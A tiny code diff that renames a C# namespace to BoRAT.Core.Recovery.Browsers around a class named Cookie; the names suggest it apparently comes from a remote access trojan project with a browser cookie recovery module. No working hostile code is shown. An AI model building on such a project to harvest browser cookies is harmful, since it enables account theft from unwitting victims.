@@ -1,6 +1,6 @@
 ﻿using System;
 
-namespace BoRAT.Recovery.Browsers
+namespace BoRAT.Core.Recovery.Browsers
 {
     public class Cookie
     {
